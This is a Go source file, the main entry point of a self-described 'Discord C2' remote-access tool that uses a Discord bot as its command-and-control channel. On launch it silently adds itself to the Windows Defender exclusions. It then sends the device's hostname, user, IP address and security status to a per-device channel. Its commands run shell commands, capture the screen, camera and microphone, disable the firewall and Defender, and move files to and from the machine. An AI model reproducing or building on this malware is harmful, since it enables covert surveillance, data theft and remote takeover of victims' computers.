package main

// This file boots the Discord C2 client, registers slash commands for this
// device, and connects to a per-device text channel.

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"runtime"
	"strings"
	"syscall"
	"time"

	"discord-c2/actions"
	"github.com/bwmarrin/discordgo"
)

// main starts the Discord session, ensures commands and the device channel
// exist, posts an initial banner message, and then blocks until shutdown.
func main() {
	loadEnvFile(".env")
	guildID = os.Getenv("DISCORD_GUILD_ID")
	token := os.Getenv("DISCORD_BOT_TOKEN")
	if token == "" || guildID == "" {
		log.Printf("missing DISCORD_BOT_TOKEN or DISCORD_GUILD_ID")
		return
	}
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		log.Printf("failed to create Discord session: %v", err)
		return
	}

	dg.AddHandler(handler)
	dg.AddHandler(handleInteraction)
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	err = dg.Open()
	if err != nil {
		log.Printf("failed to open Discord session: %v", err)
		return
	}

	log.SetOutput(&discordLogWriter{base: os.Stdout})

	commands := []*discordgo.ApplicationCommand{
		{
			Name:        "help",
			Description: "Show D‑C2 help menu for this device channel",
		},
		{
			Name:        "cmd",
			Description: "Run a shell command on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "command",
					Description: "Shell command to run",
					Required:    true,
				},
			},
		},
		{
			Name:        "screenshot",
			Description: "Capture screenshots of all displays on this device",
		},
		{
			Name:        "camera",
			Description: "Capture a snapshot from the default camera",
		},
		{
			Name:        "mic",
			Description: "Record from the microphone on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration",
					Description: "Duration in seconds (1-300)",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Destination file path on this device",
					Required:    false,
				},
			},
		},
		{
			Name:        "record",
			Description: "Record video with automatic segmented files for Discord upload",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "source",
					Description: "Recording source: camera or screen",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{
							Name:  "camera",
							Value: "camera",
						},
						{
							Name:  "screen",
							Value: "screen",
						},
					},
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "max_size_mb",
					Description: "Maximum size per file in MB (1-8)",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "duration_minutes",
					Description: "Total recording duration in minutes",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "max_parts",
					Description: "Maximum number of segments to record (1-30)",
					Required:    false,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "quality",
					Description: "Video quality (low, medium, high)",
					Required:    false,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{
							Name:  "low",
							Value: "low",
						},
						{
							Name:  "medium",
							Value: "medium",
						},
						{
							Name:  "high",
							Value: "high",
						},
					},
				},
			},
		},
		{
			Name:        "recordstop",
			Description: "Stop the current video recording for this device",
		},
		{
			Name:        "log",
			Description: "Stream or stop Go logs into this device channel",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{
							Name:  "on",
							Value: "on",
						},
						{
							Name:  "off",
							Value: "off",
						},
					},
				},
			},
		},
		{
			Name:        "cwd",
			Description: "Show current working directory on this device",
		},
		{
			Name:        "ls",
			Description: "List a directory on this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Directory to list (empty for current directory)",
					Required:    false,
				},
			},
		},
		{
			Name:        "ps",
			Description: "List running processes on this device",
		},
		{
			Name:        "pidinfo",
			Description: "Show information about a specific process ID",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionInteger,
					Name:        "pid",
					Description: "Process ID to inspect",
					Required:    true,
				},
			},
		},
		{
			Name:        "winsec",
			Description: "Show Windows firewall and Defender status for this device",
		},
		{
			Name:        "winfirewall",
			Description: "Turn Windows firewall on or off",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{
							Name:  "on",
							Value: "on",
						},
						{
							Name:  "off",
							Value: "off",
						},
					},
				},
			},
		},
		{
			Name:        "windefender",
			Description: "Turn Windows Defender real-time protection on or off",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "mode",
					Description: "on or off",
					Required:    true,
					Choices: []*discordgo.ApplicationCommandOptionChoice{
						{
							Name:  "on",
							Value: "on",
						},
						{
							Name:  "off",
							Value: "off",
						},
					},
				},
			},
		},
		{
			Name:        "windefenderexclude",
			Description: "Exclude a path from Windows Defender scans",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "path",
					Description: "Path to exclude (empty for current executable)",
					Required:    false,
				},
			},
		},
		{
			Name:        "download",
			Description: "Download a file from this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "source",
					Description: "Source file path on this device",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination label (for your reference)",
					Required:    false,
				},
			},
		},
		{
			Name:        "upload",
			Description: "Upload an attachment to this device",
			Options: []*discordgo.ApplicationCommandOption{
				{
					Type:        discordgo.ApplicationCommandOptionAttachment,
					Name:        "source",
					Description: "Source attachment to upload",
					Required:    true,
				},
				{
					Type:        discordgo.ApplicationCommandOptionString,
					Name:        "destination",
					Description: "Destination file path on this device",
					Required:    true,
				},
			},
		},
		{
			Name:        "restart",
			Description: "Restart this client process",
		},
	}

	existingCommands, err := dg.ApplicationCommands(dg.State.User.ID, guildID)
	if err != nil {
		log.Printf("failed to list existing application commands: %v", err)
	} else {
		existingNames := make(map[string]bool, len(existingCommands))
		for _, c := range existingCommands {
			existingNames[c.Name] = true
		}
		for _, cmd := range commands {
			if existingNames[cmd.Name] {
				continue
			}
			_, cmdErr := dg.ApplicationCommandCreate(dg.State.User.ID, guildID, cmd)
			if cmdErr != nil {
				log.Printf("failed to register command %s: %v", cmd.Name, cmdErr)
			}
		}
	}

	rand.Seed(time.Now().UnixNano())
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()

	ipStr := "unknown"
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, err := iface.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() {
					continue
				}
				ip = ip.To4()
				if ip == nil {
					continue
				}
				ipStr = ip.String()
				break
			}
			if ipStr != "unknown" {
				break
			}
		}
	}
	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
	cwd, _ := os.Getwd()
	firewallStatus := "n/a"
	defenderStatus := "n/a"
	if runtime.GOOS == "windows" {
		firewallStatus = "unknown"
		defenderStatus = "unknown"
		if err := ensureCurrentExeDefenderExcluded(); err != nil {
			log.Printf("failed to ensure Defender exclusion for current executable: %v", err)
		}
		if fw, err := windowsFirewallStatus(); err == nil {
			firewallStatus = fw
		} else if err != nil {
			firewallStatus = "unknown (error: " + truncateError(err.Error(), 120) + ")"
		}
		if def, err := windowsDefenderStatus(); err == nil {
			defenderStatus = def
		} else if err != nil {
			defenderStatus = "unknown (error: " + truncateError(err.Error(), 120) + ")"
		}
	}
	var categoryName string
	switch runtime.GOOS {
	case "windows":
		categoryName = "windows"
	case "linux":
		categoryName = "linux"
	case "darwin":
		categoryName = "mac"
	default:
		categoryName = "other"
	}
	log.Printf("detected OS=%s, assigning category=%s", runtime.GOOS, categoryName)
	categoryID, err := getOrCreateCategory(dg, categoryName)
	if err != nil {
		log.Printf("failed to ensure category %s: %v", categoryName, err)
		return
	}
	channelName := makeChannelName(hostname, currentUser.Username)
	log.Printf("ensuring device channel %s", channelName)
	channelID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
	if err != nil {
		log.Printf("failed to ensure device channel %s: %v", channelName, err)
		return
	}
	myChannelId = channelID
	enableLogStreaming(dg, myChannelId)
	log.Printf("log streaming enabled for channel %s on connect", myChannelId)

	go func() {
		log.Printf("checking ffmpeg availability on %s", runtime.GOOS)
		actions.EnsureFFmpegAvailable(dg, myChannelId, nil)
	}()

	// Send first message with enhanced banner-style info (and pin it)
	osLabel := ""
	switch runtime.GOOS {
	case "windows":
		osLabel = "🪟 Windows"
	case "linux":
		osLabel = "🐧 Linux"
	case "darwin":
		osLabel = "🍎 macOS"
	default:
		osLabel = "💻 " + runtime.GOOS
	}

	firstMsg := fmt.Sprintf(
		"🛰️ New device connected!\n\n"+
			"🧾 Session: *%s*\n"+
			"🌐 IP: `%s`\n"+
			"🙍 User: `%s`\n"+
			"🖥️ Hostname: `%s`\n"+
			"💽 OS: %s\n"+
			"🔧 Arch: `%s`\n"+
			"📂 CWD: `%s`\n"+
			"🛡 Firewall: `%s`\n"+
			"🧬 Defender: `%s`",
		sessionId,
		ipStr,
		currentUser.Username,
		hostname,
		osLabel,
		runtime.GOARCH,
		cwd,
		firewallStatus,
		defenderStatus,
	)
	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
	dg.ChannelMessagePin(myChannelId, m.ID)

	// Bot is now running (CTRL+C to quit)
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	dg.Close()
}

// makeChannelName derives a Discord channel name from hostname and username,
// normalizing invalid characters and limiting the length.
func makeChannelName(hostname, username string) string {
	base := strings.ToLower(hostname + "-" + username)
	var b strings.Builder
	prevDash := false
	for _, r := range base {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') {
			b.WriteRune(r)
			prevDash = false
		} else {
			if !prevDash {
				b.WriteRune('-')
				prevDash = true
			}
		}
	}
	name := strings.Trim(b.String(), "-")
	if name == "" {
		name = "device"
	}
	if len(name) > 90 {
		name = name[:90]
	}
	return name
}
